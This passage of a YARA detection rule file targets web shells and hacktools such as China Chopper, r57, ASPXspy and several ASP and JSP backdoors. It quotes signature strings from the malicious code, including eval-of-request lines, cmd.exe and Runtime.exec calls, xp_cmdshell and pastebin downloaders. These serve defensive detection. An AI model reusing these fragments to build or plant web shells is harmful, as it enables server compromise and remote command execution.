      $s2 = "host = System.Net.Dns.Resolve(\"127.0.0.1\");" fullword ascii
      $s3 = "rw.WriteLine(\"[newData]\" + targetHost + \":\" + targetPort + \":\" + socketNum" ascii
      $s4 = "Response.Write(\"Error: Bad port or host or socketnumber for creating new socket" ascii
   condition: 
      filesize < 40KB and all of them
}

rule Webshell_ChinaChopper_temp_3_RID3201 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file temp.aspx"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:46:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"" ascii
      $s1 = "\"],\"unsafe\");%>" ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 150 and all of them
}

rule WEBSHELL_ChinaChopper_Generic_Mar15_RID337B : CHINA DEMO GEN T1505_003 WEBSHELL {
   meta:
      description = "Detects China Chopper webshells"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/content/dam/legacy/resources/pdfs/fireeye-china-chopper-report.pdf"
      date = "2015-03-10 14:49:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-12-14"
      tags = "CHINA, DEMO, GEN, T1505_003, WEBSHELL"
      minimum_yara = "2.2.0"
      
   strings:
      $x_aspx = /%@\sPage\sLanguage=.Jscript.%><%eval\(Request\.Item\[.{,100}unsafe/ 
      $x_php = /<?php.\@eval\(\$_POST./ 
      $fp1 = "GET /" 
      $fp2 = "POST /" 
   condition: 
      filesize < 300KB and 1 of ( $x* ) and not 1 of ( $fp* )
}

rule ASPXspy2_RID29DB : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web shell - file ASPXspy2_RID29DB.aspx"
      author = "Florian Roth"
      reference = "not set"
      date = "2015-01-24 01:50:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin" ascii
      $s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
      $s3 = "Process[] p=Process.GetProcesses();" fullword ascii
      $s4 = "Response.Cookies.Add(new HttpCookie(vbhLn,Password));" fullword ascii
      $s5 = "[DllImport(\"kernel32.dll\",EntryPoint=\"GetDriveTypeA\")]" fullword ascii
      $s6 = "<p>ConnString : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssCl" ascii
      $s7 = "ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();" fullword ascii
      $s8 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_bla" ascii
      $s10 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility." ascii
      $s11 = "nxeDR.Command+=new CommandEventHandler(this.iVk);" fullword ascii
      $s12 = "<%@ import Namespace=\"System.ServiceProcess\"%>" fullword ascii
      $s13 = "foreach(string innerSubKey in sk.GetSubKeyNames())" fullword ascii
      $s17 = "Response.Redirect(\"http://www.rootkit.net.cn\");" fullword ascii
      $s20 = "else if(Reg_Path.StartsWith(\"HKEY_USERS\"))" fullword ascii
   condition: 
      6 of them
}

rule Pastebin_Webshell_RID2DDC : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a web shell that downloads content from pastebin.com http://goo.gl/7dbyZs"
      author = "Florian Roth"
      reference = "http://goo.gl/7dbyZs"
      date = "2015-01-13 10:49:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "file_get_contents(\"http://pastebin.com" ascii
      $s1 = "xcurl('http://pastebin.com/download.php" ascii
      $s2 = "xcurl('http://pastebin.com/raw.php" ascii
      $x0 = "if($content){unlink('evex.php');" ascii
      $x1 = "$fh2 = fopen(\"evex.php\", 'a');" ascii
      $y0 = "file_put_contents($pth" ascii
      $y1 = "echo \"<login_ok>" ascii
      $y2 = "str_replace('* @package Wordpress',$temp" ascii
   condition: 
      1 of ( $s* ) or all of ( $x* ) or all of ( $y* )
}

rule SoakSoak_Infected_Wordpress_RID31D6 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects a SoakSoak infected Wordpress site http://goo.gl/1GzWUX"
      author = "Florian Roth"
      reference = "http://goo.gl/1GzWUX"
      date = "2014-12-15 13:39:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "wp_enqueue_script(\"swfobject\");" ascii fullword
      $s1 = "function FuncQueueObject()" ascii fullword
      $s2 = "add_action(\"wp_enqueue_scripts\", 'FuncQueueObject');" ascii fullword
   condition: 
      all of ( $s* )
}

rule HawkEye_PHP_Panel_RID2D55 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects HawkEye Keyloggers PHP Panel"
      author = "Florian Roth"
      reference = "-"
      date = "2014-12-14 10:27:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$fname = $_GET['fname'];" ascii fullword
      $s1 = "$data = $_GET['data'];" ascii fullword
      $s2 = "unlink($fname);" ascii fullword
      $s3 = "echo \"Success\";" fullword ascii
   condition: 
      all of ( $s* ) and filesize < 600
}

rule JSP_jfigueiredo_APT_webshell_RID31E3 : APT DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
      author = "Florian Roth"
      reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/Browser.jsp"
      date = "2014-12-10 13:41:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "String fhidden = new String(Base64.encodeBase64(path.getBytes()));" ascii
      $a2 = "<form id=\"upload\" name=\"upload\" action=\"ServFMUpload\" method=\"POST\" enctype=\"multipart/form-data\">" ascii
   condition: 
      all of them
}

rule JSP_jfigueiredo_APT_webshell_2_RID3274 : APT DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
      author = "Florian Roth"
      reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/"
      date = "2014-12-10 14:05:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "<div id=\"bkorotator\"><img alt=\"\" src=\"images/rotator/1.jpg\"></div>" ascii
      $a2 = "$(\"#dialog\").dialog(\"destroy\");" ascii
      $s1 = "<form id=\"form\" action=\"ServFMUpload\" method=\"post\" enctype=\"multipart/form-data\">" ascii
      $s2 = "<input type=\"hidden\" id=\"fhidden\" name=\"fhidden\" value=\"L3BkZi8=\" />" ascii
   condition: 
      all of ( $a* ) or all of ( $s* )
}

rule Webshell_Insomnia_RID2DE4 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Insomnia Webshell - file InsomniaShell.aspx"
      author = "Florian Roth"
      reference = "http://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/"
      date = "2014-12-09 10:51:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Response.Write(\"- Failed to create named pipe:\");" fullword ascii
      $s1 = "Response.Output.Write(\"+ Sending {0}<br>\", command);" fullword ascii
      $s2 = "String command = \"exec master..xp_cmdshell 'dir > \\\\\\\\127.0.0.1" ascii
      $s3 = "Response.Write(\"- Error Getting User Info<br>\");" fullword ascii
      $s4 = "string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes," fullword ascii
      $s5 = "[DllImport(\"Advapi32.dll\", SetLastError = true)]" fullword ascii
      $s9 = "username = DumpAccountSid(tokUser.User.Sid);" fullword ascii
      $s14 = "//Response.Output.Write(\"Opened process PID: {0} : {1}<br>\", p" ascii
   condition: 
      3 of them
}

rule aspbackdoor_EDIT_RID2D1F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file EDIT.ASP"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 10:18:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<meta HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html;charset=gb_2312-80\">" fullword ascii
      $s2 = "Set thisfile = fs.GetFile(whichfile)" fullword ascii
      $s3 = "response.write \"<a href='index.asp'>" fullword ascii
      $s5 = "if Request.Cookies(\"password\")=\"juchen\" then " fullword ascii
      $s6 = "Set thisfile = fs.OpenTextFile(whichfile, 1, False)" fullword ascii
      $s7 = "color: rgb(255,0,0); text-decoration: underline }" fullword ascii
      $s13 = "if Request(\"creat\")<>\"yes\" then" fullword ascii
   condition: 
      5 of them
}

rule aspbackdoor_entice_RID2E71 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file entice.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 11:14:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<Form Name=\"FormPst\" Method=\"Post\" Action=\"entice.asp\">" fullword ascii
      $s2 = "if left(trim(request(\"sqllanguage\")),6)=\"select\" then" fullword ascii
      $s4 = "conndb.Execute(sqllanguage)" fullword ascii
      $s5 = "<!--#include file=sqlconn.asp-->" fullword ascii
      $s6 = "rstsql=\"select * from \"&rstable(\"table_name\")" fullword ascii
   condition: 
      all of them
}

rule Webshell_sig_238_cmd_2_RID2F09 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file cmd.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 11:40:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Process child = Runtime.getRuntime().exec(" ascii
      $s1 = "InputStream in = child.getInputStream();" fullword ascii
      $s2 = "String cmd = request.getParameter(\"" ascii
      $s3 = "while ((c = in.read()) != -1) {" fullword ascii
      $s4 = "<%@ page import=\"java.io.*\" %>" fullword ascii
   condition: 
      all of them
}

rule Webshell_aspfile2_RID2DBC : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file aspfile2.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 10:44:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "response.write \"command completed success!\" " fullword ascii
      $s1 = "for each co in foditems " fullword ascii
      $s3 = "<input type=text name=text6 value=\"<%= szCMD6 %>\"><br> " fullword ascii
      $s19 = "<title>Hello! Welcome </title>" fullword ascii
   condition: 
      all of them
}

rule Webshell_aspbackdoor_EDIR_RID30B2 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file EDIR.ASP"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 12:50:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "response.write \"<a href='index.asp'>" fullword ascii
      $s3 = "if Request.Cookies(\"password\")=\"" ascii
      $s6 = "whichdir=server.mappath(Request(\"path\"))" fullword ascii
      $s7 = "Set fs = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s19 = "whichdir=Request(\"path\")" fullword ascii
   condition: 
      all of them
}

rule Webshell_aspbackdoor_asp4_RID3106 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file asp4.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 13:04:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "system.dll" fullword ascii
      $s2 = "set sys=server.CreateObject (\"system.contral\") " fullword ascii
      $s3 = "Public Function reboot(atype As Variant)" fullword ascii
      $s4 = "t& = ExitWindowsEx(1, atype)" ascii
      $s5 = "atype=request(\"atype\") " fullword ascii
      $s7 = "AceiveX dll" fullword ascii
      $s8 = "Declare Function ExitWindowsEx Lib \"user32\" (ByVal uFlags As Long, ByVal " ascii
      $s10 = "sys.reboot(atype)" fullword ascii
   condition: 
      all of them
}

rule Webshell_aspfile1_RID2DBB : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file aspfile1.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 10:44:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "' -- check for a command that we have posted -- '" fullword ascii
      $s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
      $s5 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"><BODY>" fullword ascii
      $s6 = "<input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">" fullword ascii
      $s8 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
      $s15 = "szCMD = Request.Form(\".CMD\")" fullword ascii
   condition: 
      3 of them
}

rule Webshell_aspbackdoor_regdll_RID3208 : DEMO T1218_010 T1505_003 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file regdll.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 13:47:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1218_010, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "exitcode = oShell.Run(\"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, " ascii
      $s3 = "oShell.Run \"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, False" fullword ascii
      $s4 = "EchoB(\"regsvr32.exe exitcode = \" & exitcode)" fullword ascii
      $s5 = "Public Property Get oFS()" fullword ascii
   condition: 
      all of them
}

rule Webshell_aspbackdoor_asp3_RID3105 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file asp3.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 13:04:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<form action=\"changepwd.asp\" method=\"post\"> " fullword ascii
      $s1 = "  Set oUser = GetObject(\"WinNT://ComputerName/\" & UserName) " fullword ascii
      $s2 = "    value=\"<%=Request.ServerVariables(\"LOGIN_USER\")%>\"> " fullword ascii
      $s14 = " Windows NT " fullword ascii
      $s16 = " WIndows 2000 " fullword ascii
      $s18 = "OldPwd = Request.Form(\"OldPwd\") " fullword ascii
      $s19 = "NewPwd2 = Request.Form(\"NewPwd2\") " fullword ascii
      $s20 = "NewPwd1 = Request.Form(\"NewPwd1\") " fullword ascii
   condition: 
      all of them
}

rule Webshell_aspbackdoor_asp1_RID3103 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file asp1.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 13:04:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "param = \"driver={Microsoft Access Driver (*.mdb)}\" " fullword ascii
      $s1 = "conn.Open param & \";dbq=\" & Server.MapPath(\"scjh.mdb\") " fullword ascii
      $s6 = "set rs=conn.execute (sql)%> " fullword ascii
      $s7 = "<%set Conn = Server.CreateObject(\"ADODB.Connection\") " fullword ascii
      $s10 = "<%dim ktdh,scph,scts,jhqtsj,yhxdsj,yxj,rwbh " fullword ascii
      $s15 = "sql=\"select * from scjh\" " fullword ascii
   condition: 
      all of them
}

rule Webshell_and_Exploit_CN_APT_HK_RID3243 : APT CHINA DEMO EXPLOIT T1505_003 WEBSHELL Webshell {
   meta:
      description = "Webshell and Exploit Code in relation with APT against Honk Kong protesters"
      author = "Florian Roth"
      reference = "-"
      date = "2014-10-10 13:57:41"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, CHINA, DEMO, EXPLOIT, T1505_003, WEBSHELL, Webshell"
      minimum_yara = "1.7"
      
   strings:
      $a0 = "<script language=javascript src=http://java-se.com/o.js</script>" fullword
      $s0 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">" 
      $s1 = "<input type=\"hidden\" name=\"doing\" value=\"login\">" 
   condition: 
      $a0 or ( all of ( $s* ) )
}

rule JSP_Browser_APT_webshell_RID303A : APT DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "VonLoesch JSP Browser used as web shell by APT groups - jsp File browser 1.1a"
      author = "Florian Roth"
      reference = "-"
      date = "2014-10-10 12:30:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $a1a = "private static final String[] COMMAND_INTERPRETER = {\"" ascii
      $a1b = "cmd\", \"/C\"}; // Dos,Windows" ascii
      $a2 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" ascii
      $a3 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" ascii
   condition: 
      all of them
}

rule HKTL_DllInjection_RID2D62 : DEMO HKTL T1055_001 T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file DllInjection.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:29:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1055_001, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\BDoor\\DllInjecti" 
   condition: 
      all of them
}

rule HKTL_Mithril_v1_45_Mithril_RID3082 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file Mithril.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:42:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "cress.exe" 
      $s7 = "\\Debug\\Mithril." 
   condition: 
      all of them
}

rule HKTL_hkshell_hkrmv_RID2E15 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file hkrmv.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:59:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "/THUMBPOSITION7" 
      $s6 = "\\EvilBlade\\" 
   condition: 
      all of them
}

rule Webshell_FeliksPack3___PHP_Shells_phpft_RID3606 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phpft.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 16:38:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "PHP Files Thief" 
      $s11 = "http://www.4ngel.net" 
   condition: 
      all of them
}

rule Webshell_FSO_s_indexer_RID2FAE : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file indexer.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:07:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input type=\"r" 
   condition: 
      all of them
}

rule Webshell_r57shell_RID2D9C : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file r57shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:39:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s11 = " $_POST['cmd']=\"echo \\\"Now script try connect to" 
   condition: 
      all of them
}

rule HKTL_bdcli100_RID2B32 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file bdcli100.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 08:56:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "unable to connect to " 
      $s8 = "backdoor is corrupted on " 
   condition: 
      all of them
}

rule HKTL_HYTop2006_rar_Folder_2006X2_RID314F : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2006X2.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 13:17:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "Powered By " 
      $s3 = " \" onClick=\"this.form.sharp.name=this.form.password.value;this.form.action=this." 
   condition: 
      all of them
}

rule HKTL_rdrbs084_RID2B5C : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file rdrbs084.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:03:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Create mapped port. You have to specify domain when using HTTP type." 
      $s8 = "<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET" 
   condition: 
      all of them
}

rule Webshell_eBayId_index3_RID2F7E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file index3.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:59:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"You" 
   condition: 
      all of them
}

rule Webshell_FSO_s_phvayv_RID2F5D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phvayv.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "wrap=\"OFF\">XXXX</textarea></font><font face" 
   condition: 
      all of them
}

rule Webshell_FSO_s_casus15_2_RID2FD5 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file casus15.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:14:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "copy ( $dosya_gonder" 
   condition: 
      all of them
}

rule Webshell_installer_RID2E74 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file installer.cmd"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:15:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Restore Old Vanquish" 
      $s4 = "ReInstall Vanquish" 
   condition: 
      all of them
}

rule Webshell_FSO_s_remview_2_RID304F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file remview.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:34:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<xmp>$out</" 
      $s1 = ".mm(\"Eval PHP code\")." 
   condition: 
      all of them
}

rule Webshell_FeliksPack3___PHP_Shells_r57_RID34C2 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file r57.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 15:44:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']." 
   condition: 
      all of them
}

rule HKTL_HYTop2006_rar_Folder_2006X_RID311D : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2006X.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 13:08:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<input name=\"password\" type=\"password\" id=\"password\"" 
      $s6 = "name=\"theAction\" type=\"text\" id=\"theAction\"" 
   condition: 
      all of them
}

rule Webshell_FSO_s_phvayv_2_RID2FEE : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phvayv.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:18:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "rows=\"24\" cols=\"122\" wrap=\"OFF\">XXXX</textarea></font><font" 
   condition: 
      all of them
}

rule Webshell_elmaliseker_RID2F34 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file elmaliseker.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:47:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "javascript:Command('Download'" 
      $s5 = "zombie_array=array(" 
   condition: 
      all of them
}

rule Webshell_FSO_s_tool_RID2E7D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file tool.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:16:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "\"\"%windir%\\\\calc.exe\"\")" 
   condition: 
      all of them
}

